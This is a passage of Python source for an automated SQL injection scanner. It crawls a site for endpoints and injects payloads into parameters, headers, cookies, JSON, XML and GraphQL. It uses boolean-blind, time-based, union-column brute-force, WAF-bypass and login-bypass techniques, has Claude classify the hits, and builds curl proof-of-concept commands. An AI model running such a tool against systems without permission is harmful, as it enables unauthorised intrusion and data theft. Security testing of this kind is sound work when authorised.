                qs_params  = list(urllib.parse.parse_qs(parsed_url.query).keys())
                all_params = (params or []) + qs_params
                eps.append(Endpoint(url, method, all_params or [], "js", vector_type="query"))
        for m in self.AXIOS_RE.finditer(js):
            add(self.normalize(urllib.parse.urljoin(base_url, m.group(2))), m.group(1).upper())
        for m in self.FETCH_RE.finditer(js):
            add(self.normalize(urllib.parse.urljoin(base_url, m.group(1))), "GET")
        for m in self.API_RE.finditer(js):
            add(self.normalize(urllib.parse.urljoin(base_url, m.group(1))), "GET")
        for m in self.JQUERY_RE.finditer(js):
            method = m.group(1).upper()
            if method not in ("GET","POST","PUT","DELETE","PATCH"): method = "GET"
            add(self.normalize(urllib.parse.urljoin(base_url, m.group(2))), method)
        for m in self.HTTP_RE.finditer(js):
            add(self.normalize(urllib.parse.urljoin(base_url, m.group(2))), m.group(1).upper())
        for raw in re.findall(r'`(/[a-zA-Z0-9_/${}\-/]+)`', js):
            clean = re.sub(r'\$\{[^}]+\}', '1', raw)
            n = self.normalize(urllib.parse.urljoin(base_url, clean))
            if n and n not in seen:
                seen.add(n)
                eps.append(Endpoint(n, "GET", ["id"], "js_template", vector_type="query"))
        for ep in eps:
            self._learned_paths.add(urllib.parse.urlparse(ep.url).path)
        return eps

    def _process_page(self, url: str, depth: int):
        if not self.robots.allowed(url): return [], []
        status, html, _ = http_get(url, printer=self.printer)
        if status == 0: return [], []
        if self.verbose:
            self._log(c(f"  [crawl] HTTP {status}  {url[:80]}", DIM))

        parsed = urllib.parse.urlparse(url)
        params = list(urllib.parse.parse_qs(parsed.query).keys())
        self._add_endpoint(Endpoint(url, "GET", params, "crawl", vector_type="query"))
        self._learned_paths.add(parsed.path)

        path_segs  = parsed.path.split("/")
        has_id_seg = any(
            s.isdigit() or re.fullmatch(
                r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
                s, re.IGNORECASE) for s in path_segs if s)
        if has_id_seg:
            self._add_endpoint(Endpoint(url, "GET", ["id"], "path_param", vector_type="path"))
        if not params:
            for p in COMMON_PARAMS[:8]:
                self._add_endpoint(Endpoint(url + f"?{p}=1", "GET", [p],
                                            "param_guess", vector_type="query"))
        for hdr in INJECTABLE_HEADERS:
            self._add_endpoint(Endpoint(url, "GET", params=[hdr],
                                        source="header_probe", vector_type="header",
                                        header_target=hdr))
        cookie_header = _req_opts.extra_headers.get("Cookie","")
        for ck_part in cookie_header.split(";"):
            ck_part = ck_part.strip()
            if "=" in ck_part:
                ck_name = ck_part.split("=",1)[0].strip()
                self._add_endpoint(Endpoint(url, "GET", params=[ck_name],
                                            source="cookie_probe", vector_type="cookie",
                                            cookie_param=ck_name))
        if status not in (200, 301, 302, 403): return [], []

        for ep in self.extract_forms(html, url):
            self._add_endpoint(ep)
        for block in re.findall(r'<script[^>]*>(.*?)</script>', html,
                                re.IGNORECASE | re.DOTALL):
            for ep in self.extract_js_endpoints(block, url):
                self._add_endpoint(ep)
        if "graphql" in url.lower() or "graphql" in html.lower():
            self._probe_graphql(self.origin + "/graphql")

        js_srcs  = []
        children = []
        for src in re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE):
            js_url = self.normalize(urllib.parse.urljoin(url, src))
            if js_url: js_srcs.append(js_url)
        if depth < self.max_depth:
            children = self.extract_links(html, url)
        return children, js_srcs

    def _fetch_js(self, src_url: str, base_url: str):
        with self._js_lock:
            if src_url in self.js_files: return
            self.js_files.add(src_url)
        _, js, _ = http_get(src_url, printer=self.printer)
        if js:
            for ep in self.extract_js_endpoints(js, base_url):
                self._add_endpoint(ep)

    def _guess_api_paths(self):
        common = [
            ("/api/v1/users","GET"),   ("/api/v1/products","GET"),
            ("/api/v1/search","GET"),  ("/api/v1/login","POST"),
            ("/api/users","GET"),      ("/api/products","GET"),
            ("/api/search","GET"),     ("/api/login","POST"),
            ("/api/items","GET"),      ("/api/orders","GET"),
            ("/api/books","GET"),      ("/api/books/search","GET"),
            ("/api/books/1","GET"),    ("/api/reviews","GET"),
            ("/api/cart","GET"),       ("/api/users/1","GET"),
            ("/api/auth/login","POST"),("/api/auth/register","POST"),
            ("/search","GET"),         ("/search?q=1","GET"),
            ("/products?id=1","GET"),  ("/item?id=1","GET"),
            ("/login","POST"),         ("/register","POST"),
            ("/graphql","POST"),
        ]
        derived = set()
        for path in list(self._learned_paths):
            parts = [p for p in path.split("/") if p]
            if not parts: continue
            derived.add(("/" + parts[0] + "/1", "GET"))
            if parts[0] not in ("api","rest","v1","v2","v3"):
                derived.add(("/api/" + parts[0] + "/1", "GET"))
                derived.add(("/api/" + parts[0] + "?id=1", "GET"))
        common_paths = {p for p,_ in common}
        for path, method in derived:
            if path not in common_paths: common.append((path, method))

        self._log(c(f"\n  [API GUESS] Probing {len(common)} paths…", DIM))
        def probe(pm):
            path, method = pm
            url = self.origin + path if path.startswith("/") else path
            if not self.robots.allowed(url): return
            status, body, _ = (http_get(url, printer=self.printer)
                               if method == "GET"
                               else http_method(method, url, json_body={}, printer=self.printer))
            if status not in (0, 404, 405):
                self._add_endpoint(Endpoint(url, method, [], "api_guess", vector_type="query"))
                if "graphql" in path:
                    self._probe_graphql(url)
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, common))

    def crawl(self) -> dict:
        self._log(c(f"\n{'─'*70}", DIM))
        self._log(c(f"  [CRAWLER] {self.base}", BOLD+CYAN))
        self._log(c(f"  Threads={self.threads}  MaxPages={self.max_pages}"
                    f"  MaxDepth={self.max_depth}", DIM))
        self._log(c(f"{'─'*70}", DIM))
        self._log(c("  [SPIDER] Probing sitemaps and API specs…", DIM))
        spec_seeds = self._discover_specs()
        frontier   = [(self.base, 0)] + [(u, 1) for u in spec_seeds]
        page_count = 0
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            while frontier and page_count < self.max_pages:
                to_fetch = []
                for url, depth in frontier:
                    with self._vis_lock:
                        if url not in self._visited and page_count < self.max_pages:
                            self._visited.add(url); to_fetch.append((url, depth))
                            page_count += 1
                if not to_fetch: break
                futures = {pool.submit(self._process_page, url, depth): (url, depth)
                           for url, depth in to_fetch}
                next_frontier, js_queue = [], []
                for fut in as_completed(futures):
                    url, depth = futures[fut]
                    try:
                        children, js_srcs = fut.result()
                        next_frontier.extend((cu, depth+1) for cu in children)
                        js_queue.extend((src, url) for src in js_srcs)
                    except Exception: pass
                if js_queue:
                    js_futs = [pool.submit(self._fetch_js, src, base)
                               for src, base in js_queue]
                    for f in as_completed(js_futs):
                        try: f.result()
                        except: pass
                frontier = next_frontier
        self._guess_api_paths()
        by_method = defaultdict(int)
        by_vector = defaultdict(int)
        for ep in self.endpoints.values():
            by_method[ep.method]      += 1
            by_vector[ep.vector_type] += 1
        self._log(c(f"\n{'─'*70}", DIM))
        self._log(c(f"  CRAWL COMPLETE — {len(self.endpoints)} unique endpoints", BOLD))
        for method, cnt in sorted(by_method.items()):
            mc = METHOD_COLORS.get(method, RESET)
            self._log(f"    {c(f'[{method}]', mc+BOLD):<20} {cnt}")
        self._log(c("  Injection vectors:", DIM))
        for vtype, cnt in sorted(by_vector.items()):
            self._log(c(f"    {vtype:<20} {cnt}", DIM))
        self._log(c(f"{'─'*70}", DIM))
        return self.endpoints

# ──────────────────────────────────────────────────────────────────────────────
# SCANNER
# ──────────────────────────────────────────────────────────────────────────────
class SQLiScanner:
    def __init__(self, target: str,
                 use_forms: bool = False,
                 use_crawl: bool = False,
                 use_claude: bool = True,
                 verbose: bool = True,
                 max_payloads: int = 999,
                 scan_threads: int = SCAN_THREADS,
                 crawl_threads: int = CRAWL_THREADS,
                 respect_robots: bool = True,
                 test_headers: bool = True,
                 test_cookies: bool = True,
                 test_second_order: bool = False,
                 test_oob: bool = False,
                 test_auth_probe: bool = True,
                 dataset_path: str = None,
                 server_file: str = None):
        self.target             = target.rstrip("/")
        self.use_forms          = use_forms
        self.use_crawl          = use_crawl
        self.test_auth_probe    = test_auth_probe
        self.use_claude         = use_claude
        self.verbose            = verbose
        self.max_payloads       = max_payloads
        self.scan_threads       = scan_threads
        self.crawl_threads      = crawl_threads
        self.respect_robots     = respect_robots
        self.test_headers       = test_headers
        self.test_cookies       = test_cookies
        self.test_second_order  = test_second_order
        self.test_oob           = test_oob
        self.dataset_path       = dataset_path
        self.server_file        = server_file
        self.results            = []
        self.true_positive_results = []
        self._res_lock          = threading.Lock()
        self.printer            = SafePrinter()
        self._dataset: Optional[DatasetLoader] = None
        self._baseline_cache    = BaselineCache()

        # v7.2: per-endpoint logger registry
        parsed          = urllib.parse.urlparse(self.target)
        self._hostname  = parsed.hostname or "target"
        self._log_dir   = re.sub(r'[^\w.\-]', '_', self._hostname) + "_endpoint_logs"
        self._ep_log_registry: Optional[EndpointLoggerRegistry] = None

    def _log(self, msg): self.printer.log(msg)

    def _load_dataset(self):
        if self.dataset_path:
            self._dataset = DatasetLoader(self.dataset_path,
                                          max_payloads=self.max_payloads,
                                          printer=self.printer)
        else:
            self._dataset = None

    def _send(self, ep: Endpoint, payload: str) -> tuple:
        time.sleep(_req_opts.rate_delay)

        if ep.vector_type == "path":
            parsed   = urllib.parse.urlparse(ep.url)
            segments = parsed.path.split("/")
            for i in range(len(segments)-1, -1, -1):
                if segments[i].isdigit() or re.fullmatch(
                        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
                        segments[i], re.IGNORECASE):
                    segments[i] = urllib.parse.quote(payload, safe=""); break
            test_url = parsed._replace(path="/".join(segments)).geturl()
            return http_get(test_url, printer=self.printer)

        if ep.vector_type == "header":
            return http_get(ep.url,
                            extra_headers={ep.header_target or "X-Forwarded-For": payload},
                            printer=self.printer)

        if ep.vector_type == "cookie":
            ck_name  = ep.cookie_param or "session"
            existing = _req_opts.extra_headers.get("Cookie","")
            parts    = {p.split("=",1)[0].strip(): p.split("=",1)[1].strip()
                        for p in existing.split(";") if "=" in p}
            parts[ck_name] = payload
            return http_get(ep.url,
                            extra_headers={"Cookie": "; ".join(f"{k}={v}" for k,v in parts.items())},
                            printer=self.printer)

        if ep.vector_type == "graphql" and ep.graphql_field:
            arg  = ep.params[0] if ep.params else "id"
            body = _graphql_inject_payload(ep.graphql_field, arg, payload)
            return http_method("POST", ep.url, json_body=body, printer=self.printer)

        if ep.vector_type == "json" and ep.base_json is not None:
            json_path = getattr(ep, '_json_path', ep.params if ep.params else None)
            if json_path:
                injected = _inject_json_leaf(ep.base_json, json_path, payload)
            else:
                injected = copy.deepcopy(ep.base_json)
                for k in injected:
                    if isinstance(injected[k], str):
                        injected[k] = payload
            return http_method(ep.method, ep.url, json_body=injected, printer=self.printer)

        if ep.vector_type == "xml" and ep.base_xml is not None:
            tag      = ep.params[0] if ep.params else "value"
            injected = _inject_xml_node(ep.base_xml, tag, payload)
            return http_method(ep.method, ep.url, xml_body=injected, printer=self.printer)

        if ep.method == "GET":
            parsed = urllib.parse.urlparse(ep.url)
            qs     = urllib.parse.parse_qs(parsed.query)
            for p in (ep.params or ["q"]):
                qs[p] = [payload]
            test_url = parsed._replace(
                query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            return http_get(test_url, printer=self.printer)
        else:
            data     = ({p: payload for p in ep.params}
                       if ep.params
                       else {"id": payload, "q": payload,
                             "search": payload, "username": payload})
            use_json = (
                ep.content_type == "json"
                or any(k in ep.url for k in ["/api/", "/rest/", "/graphql"])
                or _is_login_endpoint(ep)
            )
            if use_json:
                return http_method(ep.method, ep.url, json_body=data, printer=self.printer)
            return http_method(ep.method, ep.url, data=data, printer=self.printer)

    def _ensure_baseline(self, ep: Endpoint) -> Optional[dict]:
        cached = self._baseline_cache.get(ep.key)
        if cached:
            return cached
        param = ep.params[0] if ep.params else "id"
        ctx   = get_param_context(param)
        benign_val = {
            "numeric": "1",
            "auth":    "admin",
            "search":  "hello",
            "date":    "2024-01-01",
        }.get(ctx, "1")
        status, body, elapsed = self._send(ep, benign_val)
        if status == 0:
            return None
        baseline = {"status": status, "body": body, "elapsed": elapsed}
        self._baseline_cache.set(ep.key, baseline)
        return baseline

    def _time_probe(self, ep: Endpoint, sleep_payload: str,
                    baseline_payload: str) -> dict:
        _, _, t_base  = self._send(ep, baseline_payload)
        _, _, t_sleep = self._send(ep, sleep_payload)
        delta = t_sleep - t_base
        if delta > 3.5:
            _, _, t2 = self._send(ep, sleep_payload)
            if t2 > t_base + 3.0:
                return {"type": "time_based",
                        "detail": f"dual-confirmed Δt={delta:.1f}s / {t2:.1f}s"}
        return {}

    def _boolean_probe(self, ep: Endpoint) -> dict:
        _, benign,     _ = self._send(ep, "1")
        _, body_true,  _ = self._send(ep, "' AND 1=1--")
        _, body_false, _ = self._send(ep, "' AND 1=2--")
        return boolean_blind_check(body_true, body_false, benign)

    def _run_union_brute(self, ep: Endpoint) -> Optional[int]:
        return _brute_union_columns(self._send, ep)

    def _build_payload_list(self) -> List[Tuple[str,str]]:
        builtin = (
            ERROR_PAYLOADS + UNION_PAYLOADS
            + list(BLIND_TRUE_PAYLOADS) + list(BLIND_FALSE_PAYLOADS)
            + TIME_PAYLOADS + WAF_BYPASS_PAYLOADS
            + ALL_LOGIN_PAYLOADS
        )
        if self.test_second_order: builtin += SECOND_ORDER_PAYLOADS
        if self.test_oob:          builtin += OOB_PAYLOADS

        dataset_attacks = []
        dataset_benign  = list(DEFAULT_BENIGN_INPUTS)
        if self._dataset and self._dataset.attack_payloads:
            dataset_attacks = self._dataset.attack_payloads
            if self._dataset.benign_inputs:
                dataset_benign = self._dataset.benign_inputs
            self._log(c(f"  [Payloads] Merging {len(builtin)} built-in + "
                        f"{len(dataset_attacks)} dataset payloads", CYAN))
        else:
            self._log(c(f"  [Payloads] Using {len(builtin)} built-in payloads", DIM))

        all_payloads = dataset_attacks + builtin + dataset_benign
        seen, deduped = set(), []
        for pl, tag in all_payloads:
            h = hashlib.md5(_normalise_payload(pl).encode()).hexdigest()
            if h not in seen:
                seen.add(h); deduped.append((pl, tag))
        return deduped[:self.max_payloads]

    def _payloads_for_endpoint(self, ep: Endpoint,
                               generic_payloads: List[Tuple[str,str]]) -> List[Tuple[str,str]]:
        if _is_login_endpoint(ep):
            combined = ALL_LOGIN_PAYLOADS + generic_payloads
        else:
            first_param = ep.params[0] if ep.params else "id"
            combined    = context_payloads_for_param(first_param, generic_payloads)
        seen, result = set(), []
        for pl, tag in combined:
            h = hashlib.md5(_normalise_payload(pl).encode()).hexdigest()
            if h not in seen:
                seen.add(h); result.append((pl, tag))
        return result[:self.max_payloads]

    # ── v7.2 CHANGE 1+2: _test_job now writes to per-endpoint log + timestamps ──
    def _test_job(self, ep: Endpoint, payload: str, tag: str,
                  progress: ProgressBar) -> dict:
        # ── v7.2: timestamp captured at test execution time ──────────────────
        ts = datetime.now().isoformat(timespec="seconds")

        baseline = self._ensure_baseline(ep)

        status, body, elapsed = self._send(ep, payload)
        tech   = _tag_technique(payload, tag)

        mss = multi_signal_score(
            body, elapsed, status,
            baseline_body    = baseline["body"]    if baseline else None,
            baseline_status  = baseline["status"]  if baseline else 200,
            baseline_elapsed = baseline["elapsed"] if baseline else 0.0,
        )

        baseline_diff = self._baseline_cache.diff(
            ep.key, status, body, elapsed)

        base_t = baseline["elapsed"] if baseline else None
        heur   = heuristic_check(body, elapsed, base_t)

        if tag.startswith("time_") and not tag.endswith("_baseline"):
            base_pl   = next((p for p,t in TIME_BASELINE_PAYLOADS
                              if t == tag + "_baseline"), "' AND SLEEP(0)--")
            time_find = self._time_probe(ep, payload, base_pl)
            if time_find: heur = time_find

        if heur:
            verdict    = "sqli_confirmed"
            confidence = max(95, mss["confidence"])
            reason     = f"Heuristic: {heur['type']} — {heur['detail']}"
        elif mss["verdict"] in ("sqli_confirmed","sqli_possible"):
            verdict    = mss["verdict"]
            confidence = mss["confidence"]
            reason     = f"MultiSignal: {mss['detail']}"
        elif baseline_diff.get("suspicious"):
            verdict    = "sqli_possible"
            confidence = 45
            reason     = (f"BaselineDiff: jaccard={baseline_diff.get('jaccard',1):.2f} "
                          f"size_ratio={baseline_diff.get('size_ratio',0):.2f} "
                          f"sql_tokens={baseline_diff.get('sql_keywords_leaked',[])}")
        else:
            verdict    = "safe"
            confidence = 0
            reason     = "No signals"

        result = {
            "url": ep.url, "method": ep.method,
            "vector_type": ep.vector_type,
            "param": ",".join(str(p) for p in ep.params) if ep.params else "auto",
            "payload": payload, "tag": tag, "technique": tech,
            "source": ep.source,
            "status": status, "elapsed": elapsed,
            # ── v7.2 Feature 2: timestamp field ──────────────────────────────
            "timestamp": ts,
            "heuristic": heur,
            "multi_signal": mss,
            "baseline_diff": baseline_diff,
            "verdict": verdict, "confidence": confidence, "reason": reason,
        }

        if self.use_claude and verdict in ("sqli_confirmed","sqli_possible"):
            ai = claude_classify(payload, body, elapsed,
                                 ep.method, ep.vector_type, tech, mss)
            result["claude"] = ai
            if ai["verdict"] == "sqli_confirmed":
                result["confidence"] = max(confidence, ai["confidence"])
            result["reason"] += f" | Claude: {ai['reason']}"
            if ai["verdict"] in ("sqli_confirmed","sqli_possible"):
                verdict = ai["verdict"]
                result["verdict"] = verdict

        progress.inc()
        self._print_result(result)

        # ── v7.2 Feature 1: write to per-endpoint log ─────────────────────────
        if self._ep_log_registry is not None:
            ep_logger = self._ep_log_registry.get(ep)
            ep_logger.write(
                f"[{ts}] [{result['verdict'].upper():<16}] "
                f"conf={result['confidence']:>3}%  "
                f"score={result.get('multi_signal',{}).get('total_score',0):>3}  "
                f"t={elapsed:.2f}s  "
                f"tag={tag}  "
                f"payload={payload[:80]}"
            )
            if result["verdict"] != "safe":
                ep_logger.write(f"           reason: {reason[:160]}")

        with self._res_lock:
            self.results.append(result)

        if result["verdict"] in ("sqli_confirmed","sqli_possible"):
            result["body"] = body
            verified = verify_true_positive(
                result, self._send, ep, use_claude=self.use_claude)
            del result["body"]
            fp = verified["fp_check"]
            if fp["verified_true_positive"]:
                with self._res_lock:
                    self.true_positive_results.append(verified)
                self._log(c(
                    f"  ✔ TRUE POSITIVE  [{result['method']}][{ep.vector_type}]"
                    f"[{tech}] {result['url'][:55]} — {result['payload'][:35]}",
                    GREEN+BOLD))
                if self.verbose:
                    self._log(c(f"    ↳ FP {fp['checks_passed']}/{fp['checks_total']}: "
                                f"{fp['summary'][:120]}", DIM))
            else:
                self._log(c(
                    f"  ✘ FALSE POSITIVE [{result['method']}][{ep.vector_type}]"
                    f"[{tech}] {result['url'][:55]} — {result['payload'][:35]}",
                    YELLOW+BOLD))
        return result

    def _print_result(self, r: dict):
        v    = r["verdict"]
        icon = (c("⚠ SQLI", RED+BOLD) if v == "sqli_confirmed"
                else c("~ POSS", YELLOW) if v == "sqli_possible"
                else c("✓ SAFE", GREEN))
        mc   = METHOD_COLORS.get(r["method"], RESET)
        meth = c(f"[{r['method']}]", mc+BOLD)
        vt   = c(f"[{r['vector_type']}]", DIM)
        tech = c(f"[{r.get('technique','?')}]", MAGENTA)
        ps   = r["payload"][:28] + ("…" if len(r["payload"]) > 28 else "")
        urls = r["url"][len(self.target):][:33] or "/"
        mss_score = r.get("multi_signal",{}).get("total_score", 0)
        # ── v7.2 Feature 2: timestamp printed inline ──────────────────────────
        ts_short = r.get("timestamp","")[-8:]  # HH:MM:SS portion
        self._log(
            f"  {icon}  {meth:<18}{vt:<14}{tech:<6} "
            f"{c(urls, DIM):<35} "
            f"{c(ps, DIM):<31}  "
            f"conf={c(str(r['confidence'])+'%', BOLD)}  "
            f"score={c(str(mss_score), CYAN)}  "
            f"t={r['elapsed']:.2f}s  "
            f"{c(ts_short, DIM)}")
        if self.verbose and r["reason"]:
            self._log(f"    {DIM}↳ {r['reason'][:160]}{RESET}")

    def _collect_endpoints(self) -> list:
        eps    = {}
        robots = RobotsChecker(self.target, respect=self.respect_robots,
                               printer=self.printer)

        def add(ep):
            if ep.key not in eps: eps[ep.key] = ep

        if self.server_file:
            self._log(c(f"\n  [ROUTE PARSER] Parsing: {self.server_file}", CYAN+BOLD))
            rp = ExpressRouteParser(self.server_file, self.target, printer=self.printer)
            for ep in rp.to_endpoints():
                add(ep)
            self._log(c(f"  [ROUTE PARSER] Added {len(rp.routes)} route-derived endpoint(s)", CYAN))

        if self.use_crawl:
            crawler = WebCrawler(self.target, self.printer,
                                 threads=self.crawl_threads,
                                 verbose=self.verbose, robots=robots)
            for ep in crawler.crawl().values():
                add(ep)
        else:
            parsed = urllib.parse.urlparse(self.target)
            params = list(urllib.parse.parse_qs(parsed.query).keys())
            if params:
                add(Endpoint(self.target, "GET", params, "url", vector_type="query"))
            else:
                for p in COMMON_PARAMS[:10]:
                    add(Endpoint(self.target + f"?{p}=1", "GET", [p],
                                 "param_guess", vector_type="query"))
            if self.use_forms:
                _, html, _ = http_get(self.target, printer=self.printer)
                dummy = WebCrawler(self.target, self.printer, verbose=False, robots=robots)
                for ep in dummy.extract_forms(html, self.target):
                    add(ep)
            if self.test_auth_probe:
                for path, method in AUTH_PATHS:
                    url = self.target.rstrip("/") + path
                    status, _, _ = http_method(method, url, json_body={}, printer=self.printer)
                    if status not in (0, 404):
                        add(Endpoint(url, method,
                                     ["username","password","email","login"],
                                     "auth_probe", vector_type="form"))
            if self.test_headers:
                for hdr in INJECTABLE_HEADERS:
                    add(Endpoint(self.target, "GET", [hdr],
                                 "header_probe", vector_type="header",
                                 header_target=hdr))
            if self.test_cookies:
                for ck_part in _req_opts.extra_headers.get("Cookie","").split(";"):
                    ck_part = ck_part.strip()
                    if "=" in ck_part:
                        ck_name = ck_part.split("=",1)[0].strip()
                        add(Endpoint(self.target, "GET", [ck_name],
                                     "cookie_probe", vector_type="cookie",
                                     cookie_param=ck_name))

        post_eps = [ep for ep in eps.values()
                    if ep.method in ("POST","PUT","PATCH")
                    and ep.vector_type not in ("json","graphql","header","cookie","path")]
        json_sub_eps = []
        for ep in post_eps:
            subs = build_json_endpoints(ep, printer=self.printer)
            if subs:
                self._log(c(f"  [JSON] {ep.url} → {len(subs)} JSON leaf sub-endpoint(s)", DIM))
                json_sub_eps.extend(subs)
        for sub_ep in json_sub_eps:
            add(sub_ep)

        return list(eps.values())

    def scan(self):
        self._log(BANNER)
        self._log(c(f"  Target        : {self.target}", BOLD))
        self._log(c(f"  Time          : {datetime.now():%Y-%m-%d %H:%M:%S}", DIM))
        self._log(c(f"  Crawler       : {'ON (' + str(self.crawl_threads) + ' threads)' if self.use_crawl else 'OFF'}", DIM))
        self._log(c(f"  Scan threads  : {self.scan_threads}", DIM))
        self._log(c(f"  Claude AI     : {'ON' if self.use_claude else 'OFF'}", DIM))
        self._log(c(f"  Dataset       : {self.dataset_path or 'none (built-in)'}", DIM))
        self._log(c(f"  Server file   : {self.server_file or 'none'}", DIM))
        self._log(c(f"  Endpoint logs : {self._log_dir}/", CYAN))
        self._log(c(f"  v7 features   : POST/JSON · Context · MultiSignal · Baseline · Login", CYAN))

        self._load_dataset()

        t0        = time.time()
        endpoints = self._collect_endpoints()

        if not endpoints:
            self._log(c("\n  No endpoints found. Try --crawl or --server-file.", YELLOW))
            self.printer.stop()
            return

        # ── v7.2 Feature 1: initialise registry now that we have endpoints ────
        self._ep_log_registry = EndpointLoggerRegistry(
            base_dir=self._log_dir, hostname=self._hostname)
        self._log(c(f"\n  [LOGS] Per-endpoint logs → ./{self._log_dir}/", DIM))

        generic_payloads = self._build_payload_list()
        ep_payload_counts = {
            ep.key: len(self._payloads_for_endpoint(ep, generic_payloads))
            for ep in endpoints
        }
        total_jobs = sum(ep_payload_counts.values())

        self._log(c(f"\n{'─'*70}", DIM))
        self._log(c(
            f"  SCAN  {len(endpoints)} endpoints  ~  "
            f"{total_jobs} jobs   [{self.scan_threads} threads]", BOLD))
        self._log(c(
            f"  Login endpoints: "
            f"{sum(1 for ep in endpoints if _is_login_endpoint(ep))} "
            f"(login-specific payloads applied)", CYAN))
        self._log(c(f"{'─'*70}\n", DIM))

        self._log(c("  [PHASE 0] Boolean-blind pre-scan…", CYAN+BOLD))
        for ep in endpoints:
            blind = self._boolean_probe(ep)
            if blind:
                self._log(c(
                    f"  ⚡ Boolean-blind candidate  [{ep.method}][{ep.vector_type}]"
                    f" {ep.url[:60]}  {blind['detail']}", YELLOW+BOLD))

        query_eps = [ep for ep in endpoints if ep.vector_type in ("query","form")]
        if query_eps:
            self._log(c(f"\n  [PHASE 1] Union column brute ({len(query_eps)} endpoints)…",
                        CYAN+BOLD))
            for ep in query_eps[:20]:
                ncols = self._run_union_brute(ep)
                if ncols:
                    self._log(c(
                        f"  ⚡ UNION works — {ncols} column(s)  "
                        f"[{ep.method}] {ep.url[:60]}", YELLOW+BOLD))

        progress = ProgressBar(total_jobs, "Scanning")
        with ThreadPoolExecutor(max_workers=self.scan_threads) as pool:
            futures = []
            for ep in endpoints:
                self._ensure_baseline(ep)
                payloads_for_ep = self._payloads_for_endpoint(ep, generic_payloads)
                for payload, tag in payloads_for_ep:
                    futures.append(
                        pool.submit(self._test_job, ep, payload, tag, progress))
            for fut in as_completed(futures):
                try: fut.result()
                except Exception as ex:
                    self._log(c(f"  [thread error] {ex}", YELLOW))

        # ── v7.2 Feature 1: close all endpoint log files ──────────────────────
        if self._ep_log_registry:
            self._ep_log_registry.close_all()
            self._log(c(f"\n  [LOGS] Endpoint logs closed → ./{self._log_dir}/", DIM))

        self._log(c(f"\n  Scan done in {time.time()-t0:.1f}s  "
                    f"({total_jobs/(time.time()-t0+0.001):.0f} tests/sec)", CYAN))
        self.printer.stop()
        self._print_summary()

    def _print_summary(self):
        results     = self.results
        total       = len(results)
        confirmed   = sum(1 for r in results if r["verdict"] == "sqli_confirmed")
        possible    = sum(1 for r in results if r["verdict"] == "sqli_possible")
        safe_cnt    = sum(1 for r in results if r["verdict"] == "safe")
        tp_verified = len(self.true_positive_results)

        by_tech   = defaultdict(int)
        for r in results:
            if r["verdict"] in ("sqli_confirmed","sqli_possible"):
                by_tech[r.get("technique","?")] += 1

        by_vector = defaultdict(list)
        for r in self.true_positive_results:
            by_vector[r.get("vector_type","query")].append(r)

        sep = "═" * 70
        print(c(f"\n{sep}", DIM))
        print(c("  SCAN SUMMARY  —  v7.2 (Per-Endpoint Logs + Timestamps + Final Summary)", BOLD))
        print(c(sep, DIM))
        print(f"  Total tests      : {c(str(total), BOLD)}")
        print(f"  SQLi Confirmed   : {c(str(confirmed), RED+BOLD)}")
        print(f"  SQLi Possible    : {c(str(possible), YELLOW)}")
        print(f"  Clean/Safe       : {c(str(safe_cnt), GREEN)}")
        if by_tech:
            print(c("\n  Findings by technique:", DIM))
            for tech, cnt in sorted(by_tech.items(), key=lambda x: -x[1]):
                tech_label = {
                    "E":"Error-based","B":"Boolean-blind","T":"Time-based",
                    "U":"Union","S":"Stacked","Q":"Inline-query",
                    "L":"Login-bypass","D":"Dataset","W":"WAF-bypass"
                }.get(tech, tech)
                print(f"    {c(tech, MAGENTA):<6} {tech_label:<18} {cnt}")
        print(c(f"\n  VERIFIED TRUE POSITIVES  ({tp_verified})", GREEN+BOLD))
        for vtype, findings in sorted(by_vector.items()):
            print(f"    {c(vtype, CYAN):<20} {len(findings)} finding(s)")
        if self._dataset and self._dataset.attack_payloads:
            ds_hits = sum(1 for r in self.true_positive_results
                          if r.get("tag","").startswith("dataset_"))
            print(c(f"\n  Dataset payload hits: {ds_hits} / {len(self._dataset.attack_payloads)}", CYAN))
        baseline_helps = sum(1 for r in results
                             if r.get("baseline_diff",{}).get("suspicious") and
                                r.get("verdict") in ("sqli_confirmed","sqli_possible"))
        print(c(f"  Baseline-diff catches: {baseline_helps}", CYAN))
        print(c(f"  Endpoint logs saved : ./{self._log_dir}/", CYAN))

        if tp_verified > 0:
            print(c(f"\n  ⚠  VULNERABLE — {tp_verified} verified SQLi finding(s)!", RED+BOLD))
        elif possible > 0:
            print(c("\n  ~  SUSPICIOUS — Possible SQLi; manual review needed.", YELLOW))
        else:
            print(c("\n  ✓  No SQLi detected.", GREEN))
        print(c(sep, DIM))

    # ──────────────────────────────────────────────────────────────────────────
    # v7.1 + v7.2 REPORTING MODULE
    # ──────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _curl_poc(r: dict) -> str:
        url     = r["url"]
        method  = r["method"]
        payload = r["payload"]
        param   = r.get("param", "id")
        vtype   = r.get("vector_type", "query")
        if vtype == "header":
            return f"curl -s -X {method} '{url}' -H '{param}: {payload}'"
        if vtype == "cookie":
            return f"curl -s -X {method} '{url}' -H 'Cookie: {param}={payload}'"
        if vtype == "json":
            return (f"curl -s -X {method} '{url}' "
                    f"-H 'Content-Type: application/json' "
                    f"-d '{{\"{param}\": \"{payload}\"}}'")
        if method == "GET":
            return f"curl -s -G '{url}' --data-urlencode '{param}={payload}'"
        return f"curl -s -X POST '{url}' --data-urlencode '{param}={payload}'"

    @staticmethod
    def _classify_findings(all_results: list) -> tuple:
        confirmed_findings = []
        possible_findings  = []
        for finding in all_results:
            verdict = finding.get("verdict", "safe")
            if verdict == "sqli_confirmed":
                confirmed_findings.append(finding)
            elif verdict == "sqli_possible":
                possible_findings.append(finding)
        return confirmed_findings, possible_findings

    @staticmethod
    def _group_findings_by_endpoint(findings: list) -> dict:
        groups = defaultdict(list)
        for finding in findings:
            endpoint_key = (
                finding.get("url", ""),
                finding.get("vector_type", "query"),
                finding.get("param", ""),
            )
            groups[endpoint_key].append(finding)
        return dict(groups)

    def _format_finding_block(self, finding: dict, confidence_label: str,
                               is_md: bool, index: int,
                               multi_payload_note: bool = False) -> list:
        lines  = []
        indent = "    " if not is_md else ""
        h3     = "#### " if is_md else "    "

        mss        = finding.get("multi_signal", {})
        mss_score  = mss.get("total_score", "—")
        ai_verdict = ""
        if finding.get("claude"):
